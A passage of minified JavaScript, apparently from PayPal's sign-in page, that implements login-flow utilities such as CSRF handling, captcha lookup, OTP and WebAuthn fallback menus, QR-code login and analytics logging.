P=document.getElementById("keepMeLogin");P&&"oneTouch"===e.overlay.variant&&$(P).addClass("hide")}if("inputPassword"===e.splitLoginContext&&a&&(p&&p.addClass("hide"),a.addClass("hide")),"inputEmail"===e.splitLoginContext&&a&&(p&&p.removeClass("hide"),a.removeClass("hide")),e.hidePwdTagLine&&u&&u.addClass("hide"),!e.hidePwdTagLine&&u&&u.removeClass("hide"),e.otpMayflyKey&&o&&login.utils.addHiddenElement("otpMayflyKey",e.otpMayflyKey,o),!e.otpMayflyKey&&$("input[name=otpMayflyKey]")&&$("input[name=otpMayflyKey]").remove(),e.rewardsKey&&o&&login.utils.addHiddenElement("rewardsKey",e.rewardsKey,o),!e.rewardsKey&&$("input[name=rewardsKey]")&&$("input[name=rewardsKey]").remove(),e.isRewardsTreatmentEligible&&o&&login.utils.addHiddenElement("isRewardsTreatmentEligible",e.isRewardsTreatmentEligible,o),!e.isRewardsTreatmentEligible&&$("input[name=isRewardsTreatmentEligible]")&&$("input[name=isRewardsTreatmentEligible]").remove(),e.legalCountry&&o&&login.utils.addHiddenElement("legalCountry",e.legalCountry,o),!e.legalCountry&&$("input[name=legalCountry]")&&$("input[name=legalCountry]").remove(),e&&e.htmlResponse)login.ads.handleAdsInterception(decodeURIComponent(e.htmlResponse));else if(e&&e.returnUrl&&!e.notifications)window.location.href=e.returnUrl;else{if(!e.profile&&e.adsChallengeUrl&&login.ads.init(e.adsChallengeUrl),e.showNoAccExists&&login.noAccExists)return s(),void login.noAccExists.showNoAccExistsView(e);if(e.qrCodeFeatureEnabled){var H=document.querySelector(".qrCodeSection"),B=document.querySelector("#qrcCanvas > img"),j=document.querySelector(".qrHeaderText"),F=document.querySelector("#loginContent"),I=document.querySelector("#loginSection"),q=document.querySelector("#login > .corral"),R=document.querySelector("#header > .paypal-logo");$(H).removeClass("hide"),$(j).removeClass("hide"),$(F).addClass("loginContent"),$(I).addClass("loginSection"),$(q).addClass("corralQR"),$(R).removeClass("paypal-logo-long"),$(R).removeClass("signin-paypal-logo"),$(R).addClass("paypal-logo-qrc"),B.src=e.qrImageUrl,login.ref_str=e.ref_str,login.qrImageUrl=e.qrImageUrl,login.maxPollAttemptsInt=e.maxPollAttempts,login.pollTimeInterval=e.pollTimeInterval,login.qrCode.initialize({clientRender:!0})}if(!e.isOtpSmsUser||e.notifications){k(e),e.pwdShowTryAnotherWay&&Z("pwdShowTryAnotherWay",!0,document.body),g&&e.pwdShowTryAnotherWay&&w&&$(w).addClass("hide"),g&&!e.pwdShowTryAnotherWay&&g.addClass("hide"),T?(N.removeClass("hide"),C.addClass("hide")):(N.addClass("hide"),C.removeClass("hide")),e.hideOnboardingFlowPwdPage&&f&&f.addClass("hide"),login.otp&&login.otp.prepareSendPage(e),e.verification&&"pending"===e.verification.page&&(login.verification.startPolling({accessToken:e.accessToken,authflowDocumentId:e.authflowDocumentId,_csrf:e._csrf,email:e.verification.email,variant:e.tpdVariant,tpdTriggerMethod:e.tpdTriggerMethod}),login.verification.showResendLink()),e.tpdDemoRefresh&&login.utils.isTpdDemo()&&i&&i.value&&(i.value="",document.body.removeAttribute("data-is-prefill-email-enabled"),document.body.removeAttribute("data-tpd-demo"),document.body.removeAttribute("data-tpd-variant"),window.location.href="/signin");var U=document.getElementById("keepMeLogin");if(!e.keepMeLoggedInEnabled&&U&&$(U).addClass("hide"),e.autoRememberMe){var z=document.getElementById("keepMeLoggedIn");z&&(z.checked=!0)}G(),e.setBuyer&&setTimeout((function(){Tt()&&login.xoPlanning.triggerSetBuyerCall(e.setBuyer)}),300)}else login.otp.prepareSendPage(e)}}function M(t){429!==t.status?window.location.href=window.location.href:$(e).removeClass("spinner")}function F(){var e=document.querySelector('input[name="intent"]');return e&&e.value||""}function R(){var e=document.querySelector("input[name=flowId]");return e&&e.value||""}function U(){var e=document.querySelector("input[name=_sessionID]");return e&&e.value}function Q(e){return e?{container:e.querySelector("div.textInput"),field:e.querySelector("input[type=text]"),errMsgContainer:e.querySelector("div.errorMessage"),errMsg:e.querySelector("div.errorMessage .emptyError"),playAudioBtn:e.querySelector(".captchaPlay"),refreshCaptchaBtn:e.querySelector(".captchaRefresh"),audioTag:e.querySelector(".audio audio"),image:e.querySelector(".captcha-image img"),audioLink:e.querySelector(".audio a")}:null}function G(){var e=document.querySelector("#splitPassword");e&&$(e).addClass("transformRightToLeft")}function Y(e,t,n){var r=document.createElement("input");n&&(r.setAttribute("type","hidden"),r.setAttribute("name",e),r.setAttribute("value",t),n.appendChild(r))}function Z(e,t,n){n&&n.querySelector('input[name="'+e+'"]')||Y(e,t,n)}function st(){var e=document.getElementById("token");return e&&e.value||""}function ot(e){var t=document.getElementById("token");t&&e&&(t.value=e)}function vt(){var e=document.querySelector("input[name=ctxId]");return e&&e.value||""}function mt(e){return e?e.isPwdlessPriorityEnabled:!!$("body").data("isPwdlessPriorityEnabled")}function Tt(){var e=document.querySelector('input[name="fn_sync_data"]');return e&&e.value}function It(e,t,n){if(t){var r=t.querySelector("#tryAnotherWayModal"),i=t.querySelector(".modal-content"),s=t.querySelector("#closeModal");eventPreventDefault(e),r&&i&&(e&&e.target&&e.target!==r&&e.target!==s||($(r).removeClass("transitioned"),$(i).removeClass("transitioned"),login.logger.log({evt:"try_another_way",data:"try_another_way_close_window_clicked",calEvent:!0}),login.utils.logTryAnotherWayInstrumentData({page:n,action:"menuClosed"}),login.logger.pushLogs(),setTimeout((function(){$(r).addClass("hide")}),400)))}}function zt(e){var n=$("body").data("passKeyPlatform");return"webAuthn"===e&&n?"passkey":{login:"password",webAuthn:"webauthn",otp:"sms_otp",emailOtp:"email_otp",verifyotp:"verify_sms_otp",verifyemailOtp:"verify_email_otp"}[e]||""}function Xt(e,t){var n=document.querySelector("#guestCheckout");eventPreventDefault(e),v(n)(e),login.logger.log({evt:"try_another_way",data:"checkout_as_guest_clicked",instrument:!0}),login.utils.logTryAnotherWayInstrumentData({page:t,action:"menuPressed",option:"signup"}),login.logger.pushLogs()}function Vt(e){e=e||{};var t=document.querySelector('#main section[id="verifyOtp"]'),n=document.querySelector('#main section[id="otpLogin"]'),r=document.querySelector("#fpLogIn"),i=$("#login"),s=document.querySelector("#loginWithPassword"),o=s&&s.parentElement,u=login.utils.isHybridLoginExperience(),a=u?"prepare_hybrid_pwd":"prepare_pwd";if(eventPreventDefault(),!i&&"webAuthn"===e.integrationType){return login.logger.pushLogs({complete:function(){var e=$("input[name=requestUrl]")&&$("input[name=requestUrl]").val();if(!e)return login.logger.log({evt:"int_error_desc",data:"invalid_url",instrument:!0}),login.logger.log({evt:"ERROR",data:"invalid_url",calEvent:!0}),login.logger.pushLogs();e=login.utils.updateParamValue(e,"loginType","login"),e=login.utils.updateParamValue(e,"taw","false"),window.location.href=e},data:{logStartTime:Date.now()}})}$(o)&&$(o).addClass("hide"),"webAuthn"===e.integrationType&&$(r)&&$(r).remove(),"otp"!==e.integrationType&&"verifyotp"!==e.integrationType||($(t)&&$(t).remove(),$(n)&&$(n).remove(),login.otp.loadChallengePage({loginPreference:"password_login"})),"emailOtp"!==e.integrationType&&"verifyemailOtp"!==e.integrationType||($(t)&&$(t).remove(),$(n)&&$(n).remove(),login.otp.loadChallengePage({loginPreference:"password_login"})),i&&$("#login").removeClass("hide"),login.logger.pushLogs(),function Ft(){var e=document.querySelector("#email"),t=document.querySelector("#password");e&&e.hasAttribute("disabled")&&e.removeAttribute("disabled"),t&&t.hasAttribute("disabled")&&t.removeAttribute("disabled")}(),login.logger.log({evt:"login_method",data:"password",instrument:!0}),login.logger.log({evt:"state_name",data:u?"begin_hybrid_pwd":"begin_pwd",instrument:!0}),login.logger.log({evt:"transition_name",data:a,instrument:!0}),login.logger.pushLogs()}function $t(e,t){if(e&&e.currentTarget){var n=e.currentTarget;eventPreventDefault(e),login.utils.getOutboundLinksHandler(n)(e),login.logger.log({evt:"try_another_way",data:"pwd_recovery_link_clicked",instrument:!0}),login.utils.logTryAnotherWayInstrumentData({page:t,action:"menuPressed",option:"passwordRecovery"}),login.logger.pushLogs()}else login.logger.log({evt:"try_another_way",data:"pwd_recovery_link_clicked_error",calEvent:!0})}function Gt(e){eventPreventDefault(e);var t=document.querySelector("#guestCheckoutTeslaSignUp"),n=$("#guestCheckoutTeslaSignUp"),r=$(".tesla-signup-modal-content");n&&r&&(e&&e.target&&e.target!==t&&"closeModal"!==e.target.id||(login.logger.log({evt:"guest_checkout_tesla_signup_sheet",data:"guest_checkout_tesla_signup_sheet_close_window_clicked",calEvent:!0}),login.logger.pushLogs(),n.removeClass("transitioned"),r.removeClass("transitioned"),setTimeout((function(){n.addClass("hide")}),400)))}function Yt(e){eventPreventDefault(e),i({nonTransparentMask:!0}),window.location=document.getElementById("btnCreateAccount").getAttribute("href"),login.logger.log({evt:"guest_checkout_tesla_signup_sheet",data:"guest_checkout_tesla_signup_sheet_continue_button_clicked",calEvent:!0}),login.logger.pushLogs()}function en(e){eventPreventDefault(e),i(),window.location=document.getElementById("btnReturnToMerchant").getAttribute("href"),login.logger.log({evt:"guest_checkout_tesla_signup_sheet",data:"guest_checkout_tesla_signup_sheet_return_to_merchant_button_clicked",calEvent:!0}),login.logger.pushLogs()}var e=document.querySelector(".transitioning"),t=document.querySelector(".lockIcon"),n=document.querySelector(".transitioning p.checkingInfo");return{showSpinner:i,hideSpinner:s,showSpinnerMessage:function o(e){var t;""===e?$(n).removeClass("hide"):(t=document.querySelector(".transitioning p."+e))&&$(t).removeClass("hide")},hideSpinnerMessage:function h(e){var t;""===e?$(n).addClass("hide"):(t=document.querySelector(".transitioning p."+e))&&$(t).addClass("hide")},getOutboundLinksHandler:v,isFieldPrefilled:function H(e){return!!e&&(function P(e){return!!(e&&window.chrome&&window.chrome.webstore&&"rgb(250, 255, 189)"===getComputedStyle(e).backgroundColor)}(e)||e.value&&e.value.length>0)},notYouClickHandler:function g(e,t){eventPreventDefault(e),w(O,M,t)},notYouClickHandlerForCookiedUser:function y(e,t){eventPreventDefault(e),w((function(){window.location.href=window.location.href}),M,t)},notYouClickHandlerForWebauthnUser:function b(e,t){eventPreventDefault(e);var n=function(){var t=(document.querySelector("input[name=requestUrl]")||{}).value||window.location.href;t=login.utils.updateParamValue(t,"loginType","login"),window.location.href=t};w(n,n,t)},getEmptyPattern:x,getEmailPattern:T,getInvalidUserIdPattern:N,submitPublicCredential:function C(e){var t,n=document.querySelector("form[name=login]"),r=document.querySelector("#email"),i=document.querySelectorAll("form[name=login] input")||[],s={},u=($("body").data("loadStartTime"),$("body").data("isCookiedUser"));if(login.utils.logCPLData({startTime:login.utils.pubCredPageRenderEndTime,status:"success",flowName:u?"Process Next Btn Click Cookied":"Process Next Btn Click Uncookied"}),e&&r&&((t=!e.match(/\s/g))&&(t=(e=e.replace(/^\s+|\s+$/,"")).match(/^\S+@\S+\.\S+$/)),t)){for(var a=0;a<i.length;a++)s[i[a].name]=i[a].value;e&&(r.value=e,s.login_email=e,s.splitLoginContext="inputEmail",delete s.login_phone,delete s.phoneCode),delete s.login_password,delete s.login_pin,$.ajax({url:n.getAttribute("action"),data:s,success:login.utils.successfulXhrHandler,fail:login.utils.failedXhrSubmitHandler})}},successfulXhrHandler:O,failedXhrSubmitHandler:M,documentClickHandler:function _(e){login.pubsub&&login.pubsub.publish("WINDOW_CLICK",e)},toggleRememberInfoTooltip:function D(e){var n,r,t=document.querySelector(".rememberProfile .bubble-tooltip");if(t&&e&&getEventTarget(e)){if(n=$(t),(r=$(getEventTarget(e))).hasClass("infoLink")||r.hasClass("bubble-tooltip"))return eventPreventDefault(e),void n.toggle();n.addClass("hide")}},updateView:k,isInIframe:function B(){return window.self!==window.top},isInContextIntegration:function W(){return!!window.xprops},getSplitLoginContext:function j(){var e=document.querySelector('input[name="splitLoginContext"]');return e&&e.value},getIntent:F,getReturnUri:function I(){var e=document.querySelector('input[name="returnUri"]');return e&&e.value||""},getReturnUriState:function q(){var e=document.querySelector('input[name="state"]');return e&&e.value||""},getFlowId:R,getSessionId:U,getKmliCb:function z(){return document.querySelector("#keepMeLoggedIn")},getActiveCaptchaElement:function X(e){var t,n=document.querySelector('input[name="splitLoginCookiedFallback"]');if(!e||n)return Q(t=document.querySelector("#captcha"));switch(e.value){case"inputEmail":t=document.querySelector(p()?"#splitHybridCaptcha":"#splitEmailCaptcha");break;case"inputPhone":t=document.querySelector(p()?"#splitHybridCaptcha":"#splitPhoneCaptcha");break;case"inputPassword":case"inputPin":t=document.querySelector(p()?"#splitHybridCaptcha":"#splitPasswordCaptcha");break;case"implicitEmail":t=document.querySelector("#implicitEmailCaptcha");break;default:t=null}return t&&$(t).hasClass("hide")?null:Q(t)},getCaptchaDom:Q,getQueryParamFromUrl:function V(e,t){var n=(t=decodeURIComponent(t))&&t.split("?")[1],r={};if(n)return n.split("&").forEach((function(e){var t=e.split("=");r[t[0]]=t[1]})),r[e]},setSliderToPasswordContainer:G,getQueryParamsObj:function J(e){var r,i,t=e&&e.split("?")[1],n={};if(t){r=t.split("&");for(var s=0;s<r.length;s++)n[(i=r[s].split("="))[0]]=i[1];return n}},updateParamValue:function K(e,t,n){var i,r=login.utils.getQueryParamsObj(e);return r?void 0!==r[t]?(i=r[t],e.replace(t+"="+i,t+"="+n)):e+"&"+t+"="+n:"?"===e[e.length-1]?e+t+"="+n:e+"?"+t+"="+n},addHiddenElement:Y,addHiddenElementIfNotExist:Z,doImpressionTracking:function et(e){try{PAYPAL.analytics.instance.recordImpression({data:e.sys.tracking.fpti.dataString})}catch(t){}},createIframe:function tt(e){var t=document.createElement("iframe"),n=["id","title","className","frameBorder","sandbox","src","style"];if(e){for(var r=0;r<n.length;r++)e[n[r]]&&(t[n[r]]=e[n[r]]);return document.body.appendChild(t),t}},postPpBridgeMessage:function nt(e){var t=window.opener;try{if(e="string"==typeof e?e:JSON.stringify(e),t&&(window.navigator.userAgent.match(/edge/i)||t.postMessage&&!window.navigator.userAgent.match(/msie|trident/i)))return t.postMessage(e,"*"),!0;var n=t&&t.frames&&t.frames.length&&t.frames.PayPalBridge;if(n&&n.returnToParent)return n.returnToParent(e),!0}catch(r){return!1}return!1},isPpFrameMiniBrowser:function rt(){return window.opener&&window.name&&0===window.name.indexOf("PPFrame")},updatePageLevelError:function it(e,t){var r,i,n=document.querySelector(".notifications");n&&(r=document.createElement("p"),i=document.createTextNode(e),r.setAttribute("class","notification "+t),r.setAttribute("role","alert"),r.appendChild(i),n.appendChild(r))},makeServerRequestAndReturnPromise:function ut(e,t){return new Promise((function(n,r){var s={};(t=t||{}).data&&(s=t.data),s._csrf=st(),s._sessionID=s._sessionID||U(),t.hideSpinner||i(),$.ajax({type:t.method||"POST",url:e,data:s,dataType:"json",success:function(e){return e?(ot(e._csrf),n(e)):r()},fail:function(e){return r(e)}})}))},getCSRFToken:st,setCSRFToken:ot,isAndroidDevice:function at(){return"Google Inc."===window.navigator.vendor&&navigator.userAgent.match(/Android/i)},doesItLookLikeEmail:function ft(e){return!e||(!(e=e.replace(/[-()\.\+\s]/gi,""))||e.search(/\D+/g)>=0)},isHybridLoginExperience:p,isHybridEditableOnCookied:function d(){return"true"===$("body").data("isHybridEditableOnCookied")},isPrefillEmailEnabled:function lt(){return"true"===$("body").data("isPrefillEmailEnabled")},hidePasswordForPrefillHybrid:function ct(){var e=document.querySelector("#splitPassword");e&&$(e).addClass("hide")},isPrefilledEmailNext:function ht(){var e=document.querySelector("input[name=isPrefillEmailEnabled]");return e&&"true"===e.value},renderPasswordFromPrefillHybridView:function pt(){var e=document.querySelector(".profileRememberedEmail");e&&$(e).removeClass("cookiedProfile"),G(),k({splitLoginContext:"inputPassword",profile:{email:email&&email.value},verification:null,notifications:null})},isTpdDemo:function dt(){return"true"===$("body").data("tpdDemo")},getCtxId:vt,isPwdlessPriorityEnabled:mt,isOTEligible:function gt(){var e=!!login.oneTouchLogin&&!!$("body").data("oneTouchUser");return e&&(login.logger.log({evt:"PWDLESS_PRIORITY_CLIENT",data:"ONETOUCH_PRIORITY",calEvent:!0}),login.logger.pushLogs()),e},isAPayEnabled:function yt(e){var t=e&&e.contextualLogin||window.PAYPAL&&window.PAYPAL.ulData||{},n=mt(e),r=n&&t.aPayAuth&&isAPaySupported();return!(t.canNotMakePayment||!n)&&(r&&(login.logger.log({evt:"PWDLESS_PRIORITY_CLIENT",data:"APAY_PRIORITY",calEvent:!0}),login.logger.pushLogs()),r)},isSLActivation:function bt(e){return!("activation"!==(e&&e.slAction||window.PAYPAL&&window.PAYPAL.slData&&window.PAYPAL.slData.slAction)||!login.smartLock)&&(login.logger.log({evt:"PWDLESS_PRIORITY_CLIENT",data:"SL_PRIORITY",calEvent:!0}),login.logger.pushLogs(),!0)},isWebAuthnEligible:function wt(){var e=!!(login.webAuthn&&login.webAuthn.setContext&&$("body").data("webAuthnLoginContext"));return e&&(login.logger.log({evt:"PWDLESS_PRIORITY_CLIENT",data:"WEB_AUTHN_PRIORITY",calEvent:!0}),login.logger.pushLogs()),e},addAutofillEventHandler:function Et(e,t){e&&t&&"function"==typeof t&&addEvent(e,"input",(function(n){eventPreventDefault(n);var r=n.inputType,i=n.data;return"insertText"===r||"deleteContentBackward"===r||"insertFromPaste"===r||(i?void 0:t(n))}))},parseJsonSafe:function St(e){try{return JSON.parse(e)}catch(n){return{}}},isBrowserInPrivateMode:function xt(e){if(window.webkitRequestFileSystem)window.webkitRequestFileSystem(window.TEMPORARY,1,(function(){e({isPrivate:!1})}),(function(){e({isPrivate:!0})}));else if(/Safari/.test(window.navigator.userAgent))try{window.localStorage||e({isPrivate:!0}),window.openDatabase(null,null,null,null),window.localStorage.setItem("test",1),"1"===window.localStorage.getItem("test")&&(window.localStorage.removeItem("test"),e({isPrivate:!1}))}catch(t){e({isPrivate:!0})}else e({isPrivate:!1})},isFnDataLoaded:Tt,isCookieDisabledBrowser:function Nt(){try{return!("string"==typeof document.cookie&&document.cookie.length>0)}catch(e){return!0}},handleSlrInternalRedirect:function Ct(e){e=e||{};var t=U(),n=st(),r=document.createElement("form");return $(r).attr("method","POST"),$(r).attr("action","/signin/iroute"),Y("_csrf",n,r),Y("_sessionID",t,r),Y("accessToken",e.accessToken,r),Y("returnUrl",e.returnUrl,r),document.body.appendChild(r),r.submit()},sendPostMessage:function kt(e){PAYPAL.unifiedLoginInlinePostMessage&&"function"==typeof PAYPAL.unifiedLoginInlinePostMessage.processAndPostMessage&&PAYPAL.unifiedLoginInlinePostMessage.processAndPostMessage({event:e})},isSiAppleActivationProcessing:function Lt(){return!!document.querySelector('input[name="isSiAppleActivationProcessing"]')},createCache:function At(){var e={};return{update:function t(t){e=Object.assign(e,t)},get:function n(t){return e[t]},clear:function r(t){e[t]&&delete e[t]}}},isWebView:function Ot(){var e=window.navigator.userAgent;return/(iPhone|iPod|iPad|Macintosh).*AppleWebKit(?!.*Safari)/i.test(e)||/\bwv\b/.test(e)||/Android.*Version\/(\d)\.(\d)/i.test(e)},switchToEmailHandler:function m(e,t){eventPreventDefault(e);var n=document.querySelector("#email"),r=document.querySelector('label[for="email"]');n&&$(n).attr("placeholder",$("body").data("emailLabel")),r&&$(r).text($("body").data("emailLabel")),n&&$(n).attr("data-hybrid-in-email-only-mode",!0);var i=document.querySelector("#initialSplitLoginContext"),s={_csrf:document.querySelector("#token").value,notYou:!0,intent:F(),context_id:R(),switchToEmail:!0};i&&(s.initialSplitLoginContext=i.value),document.body.removeAttribute("data-web-authn-login-context"),$.ajax({type:"POST",url:"/signin/not-you",data:s,dataType:"json",success:O,fail:M,complete:function(){if("function"==typeof t)return t()}})},isSpinnerShown:function Mt(){var e=document.querySelector(".transitioning");return $(e).hasClass("spinner")||$(e).hasClass("spinnerWithLockIcon")},getNavigationTime:function _t(){try{var t=window.performance.getEntriesByType("navigation")[0];return Math.round(t.domInteractive)||0}catch(r){return Math.round(window.performance?window.performance.now():0)}},logCPLData:function Ht(e){e=e||{},login.logger.log({evt:"state_name",data:"CPL_LATENCY_METRICS",instrument:!0}),login.logger.log({evt:"login_experience",data:e.flowName,instrument:!0});var t=login.utils.getPerformanceTimeLatency(),n={start:e.startTime,tt:e.tt||Date.now()-e.startTime,perf_tt:t};e.t12&&(n.t12=e.t12),n=JSON.stringify(n),login.logger.log({evt:"login_auth_time",data:n,instrument:!0}),login.logger.log({evt:"status",data:e.status,instrument:!0}),login.logger.pushLogs()},getPerformanceTimeLatency:function Dt(){try{var e=window.performance.now();return Math.round(e-window.performance.getEntriesByType("navigation")[0].startTime)}catch(t){return-1}},beaverLogger:function Pt(e){var t=(e=e||{}).transition_name,n=F()||"signin",r=e.state||"start";if(t&&e.isRedirect){var i={uiState:"waiting",domain:"UL",events:[],intent:t,intentType:"submit",task:"login",flow:"missing",path:window.location.pathname,timeStamp:Math.round(window.performance.now()),timeOrigin:window.performance.timeOrigin,viewName:n};window.sessionStorage.setItem("__atomic-event-state",JSON.stringify(i))}if(login.logger.log({evt:"state_name",data:"BEAVER_LATENCY_METRICS",instrument:!0}),login.logger.log({evt:"intent",data:n,instrument:!0}),login.logger.log({evt:"state",data:r,instrument:!0}),t&&login.logger.log({evt:"transition_name",data:e.transition_name,instrument:!0}),("start"===r?window.performance.now():login.utils.getPerformanceTimeLatency())>0){var o=JSON.stringify({perf_tt:login.utils.getPerformanceTimeLatency()});login.logger.log({evt:"login_auth_time",data:o,instrument:!0})}e.status&&login.logger.log({evt:"status",data:e.status,instrument:!0}),login.logger.pushLogs()},isUserAgentIneligibleForTimeout:function Bt(){for(var e=window.navigator.userAgent,t=$("body").data("xhrTimeoutIneligibleList")&&$("body").data("xhrTimeoutIneligibleList").split("|"),n=0;n<t.length;n++)if(e.indexOf(t[n])>-1)return!0;return!1},isAppDownloadBannerSupported:function jt(){return!!$("body").data("appDownloadBanner")},updateOnboardingButton:L,attachTryAnotherWayModalHandlers:function Wt(e){var t=$("body").data("webAuthnLoginContext"),n=document.querySelector("[name=isTawFullPage]"),r=n&&"true"===n.value,s=e.integrationType||"",o=login.utils.getTawModalContainerId(s),u=document.querySelector(o);if(u){var a=u.querySelector("#tryAnotherWayModal"),l=(u.querySelector("#closeModal"),u.querySelector("#guestCheckout")),c=u.querySelector("#loginWithWebauthn"),h=c&&c.parentElement,p=u.querySelector("#loginWithOtp"),d=u.querySelector("#loginWithEmailOtp"),v=u.querySelector("#loginWithPassword"),m=u.querySelector("#setPasswordLink"),g=u.querySelector("#passwordRecoveryModal"),y=zt(e.integrationType);a&&(addEvent(a,"click",(function(t){It(t,u,y)})),l&&addEvent(l,"click",(function(t){Xt(t,y)})),h&&c&&(t&&"webAuthn"!==e.integrationType&&$(h).removeClass("hide"),addEvent(c,"click",(function(){login.utils.logTryAnotherWayInstrumentData({page:y,action:"menuPressed",option:"biometrics"}),A()}))),p&&addEvent(p,"click",(function(){if(eventPreventDefault(),!login.otp)return login.logger.log({evt:"login_with_otp",data:"login_with_otp_not_shown",calEvent:!0}),void login.logger.pushLogs();login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_otp_link",instrument:!0}),login.logger.log({evt:"login_with_otp",data:"click_otp_link",calEvent:!0}),login.utils.tawClickTimes.smsOtp=Date.now(),login.logger.pushLogs();var t=$("#login");if(login.utils.logTryAnotherWayInstrumentData({page:y,action:"menuPressed",option:"sms"}),!t&&"webAuthn"===e.integrationType){var n=$("input[name=requestUrl]")&&$("input[name=requestUrl]").val();return i(),login.logger.pushLogs({complete:function(){if(!n)return login.logger.log({evt:"int_error_desc",data:"invalid_url",instrument:!0}),login.logger.log({evt:"ERROR",data:"invalid_url",calEvent:!0}),login.logger.pushLogs();n=login.utils.updateParamValue(n,"loginType","otp_login"),window.location.href=n},data:{logStartTime:Date.now()}})}login.logger.pushLogs(),login.otp.prepareSendPage({integrationType:"onTryAnotherWayModal",otpLoginEligible:"true",otpType:"sms"}),It(null,u,y)})),d&&addEvent(d,"click",(function(){if(eventPreventDefault(),login.otp){if(login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_email_otp_link",instrument:!0}),login.logger.log({evt:"login_with_otp",data:"click_email_otp_link",calEvent:!0}),login.utils.tawClickTimes.emailOtp=Date.now(),login.utils.logTryAnotherWayInstrumentData({page:y,action:"menuPressed",option:"email"}),!$("#login")&&"webAuthn"===e.integrationType){i();return login.logger.pushLogs({complete:function(){var e=$("input[name=requestUrl]")&&$("input[name=requestUrl]").val();if(!e)return login.logger.log({evt:"int_error_desc",data:"invalid_url",instrument:!0}),login.logger.log({evt:"ERROR",data:"invalid_url",calEvent:!0}),login.logger.pushLogs();e=login.utils.updateParamValue(e,"loginType","email_otp_login"),window.location.href=e},data:{logStartTime:Date.now()}})}login.logger.pushLogs(),login.otp.prepareSendPage({integrationType:"onTryAnotherWayModal",otpLoginEligible:"true",otpType:"email"}),It(null,u,y)}})),v&&addEvent(v,"click",(function(){var t=document.querySelector('#main section[id="login"] .rewardsBar');login.utils.attachCloseRewardsBarHandler(t),r&&(login.tryAnotherWayFullPage&&login.tryAnotherWayFullPage.loginWithPasswordFullPageHandler(),login.logger.pushLogs()),login.logger.log({evt:"state_name",data:"try_another_way",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_with_your_password",instrument:!0}),login.logger.log({evt:"button_label",data:"login_with_your_password",instrument:!0}),login.logger.log({evt:"try_another_way",data:"login_with_your_password_clicked",calEvent:!0}),login.logger.pushLogs(),login.utils.logTryAnotherWayInstrumentData({page:y,action:"menuPressed",option:"password"}),r||Vt(e),login.logger.pushLogs()})),m&&addEvent(m,"click",(function(t){$t(t,y)})),g&&addEvent(g,"click",(function(t){$t(t,y)})))}},hideCurrentPageTawOption:function Jt(e){var t=login.utils.getTawModalContainerId(e),n=document.querySelector(t);if(n){var r=n.querySelector("#loginWithOtp"),i=r&&r.parentElement,s=n.querySelector("#loginWithPassword"),o=s&&s.parentElement;if("otp"!==e&&"verifyotp"!==e||($(i)&&$(i).addClass("hide"),$(o)&&$(o).removeClass("hide")),"emailOtp"===e||"verifyemailOtp"===e){var u=document.querySelector("#loginWithEmailOtp"),a=u&&u.parentElement;$(a)&&$(a).addClass("hide"),$(o)&&$(o).removeClass("hide")}if("login"===e&&$(o)&&$(o).addClass("hide"),"webAuthn"===e){var f=document.querySelector("#loginWithWebauthn"),l=f&&f.parentElement;$(l)&&$(l).addClass("hide")}}},showTryAnotherWayModal:function Kt(e,t){var n=(t=t||{}).integrationType||"";eventPreventDefault(e);var r=login.utils.getTawModalContainerId(n),i=document.querySelector(r);if(i){var s=i.querySelector("#tryAnotherWayModal"),o=i.querySelector(".modal-content"),u=i.querySelector("#loginWithOtp"),f=(u&&u.parentElement,i.querySelector("#loginWithPassword")),c=(f&&f.parentElement,i.querySelector("#loginWithEmailOtp")),p=(c&&c.parentElement,i.querySelector("#loginWithWebauthn")),v=(p&&p.parentElement,i.querySelector(".modal-content-body")),m=$("body").data("passKeyPlatform"),g="";if(o){$(s).removeClass("hide"),$(s).addClass("transitioned"),$(o).addClass("transitioned"),"otp"===n&&(g="sms_otp",login.utils.logTryAnotherWayInstrumentData({page:g,action:"menuShown"})),"emailOtp"===n&&(g="email_otp",login.utils.logTryAnotherWayInstrumentData({page:g,action:"menuShown"})),"verifyotp"===n&&(g="verify_sms_otp",login.utils.logTryAnotherWayInstrumentData({page:g,action:"menuShown"})),"verifyemailOtp"===n&&(g="verify_email_otp",login.utils.logTryAnotherWayInstrumentData({page:g,action:"menuShown"})),"login"===n&&(g="password",login.utils.logTryAnotherWayInstrumentData({page:g,action:"menuShown"})),"webAuthn"===n&&(g=m?"passkey":"webauthn",login.utils.logTryAnotherWayInstrumentData({page:g,action:"menuShown"}));var y=login.utils.getTawMenuAvailableOptions({modalBody:v,pageName:g});login.logger.log({evt:"available_options",data:JSON.stringify(y),instrument:!0}),login.logger.pushLogs()}}},loginWithPasswordHandler:Vt,loginWithWebauthnClickHandler:A,logCustomCPL:function Qt(e){var n,t=e&&e.flowName||"UNKNOWN";if(window&&window.trackLazyData&&window.PAYPAL&&window.PAYPAL.analytics&&window.PAYPAL.analytics.instance&&(window.PAYPAL.analytics.options&&window.PAYPAL.analytics.options.data&&(n=window.PAYPAL.analytics.options.data.pgrp),window.performance)){var r=window.performance.now(),i=login.utils.getPerformanceTimeLatency();window.PAYPAL.analytics.instance.setLazyData("UnifiedLoginNodeWeb",{page:n,t12:i});var s={tt:i};s=Object.assign(s,e),login.utils.logCPLData(s),login.logger.log({evt:t+"_T12_TIMINGS",data:{t12:i,timeNow:r},calEvent:!0}),login.logger.pushLogs()}},attachCloseRewardsBarHandler:function S(e){var t=e&&e.querySelector(".rewardsCloseIcon"),n=document.querySelector('#main section[id="otpLogin"] .rewardsBar'),r=document.querySelector('#main section[id="verifyOtp"] .rewardsBar'),i=document.querySelector('#main section[id="login"] .rewardsBar');addEvent(t,"click",(function(e){e.stopPropagation(),e.preventDefault();var t=E();n&&$(n).addClass("hide"),r&&$(r).addClass("hide"),i&&$(i).addClass("hide"),login.logger.log({evt:"state_name",data:"login_offers_display",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_login_message_"+t+"_x",instrument:!0}),login.logger.pushLogs()})),addEvent(e,"click",(function(e){e.stopPropagation(),e.preventDefault();var t=E();login.logger.log({evt:"state_name",data:"login_offers_display",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_login_message_"+t,instrument:!0}),login.logger.pushLogs()}))},getPageStateName:u,logTryAnotherWayInstrumentData:function a(e){var t=e.page,n=e.action,r=e.option||"";if(["linkShown","linkPressed","menuShown","menuPressed","menuClosed"].includes(n)&&("menuPressed"!==n||["email","sms","biometrics","signup","password","passwordRecovery"].includes(r))){var 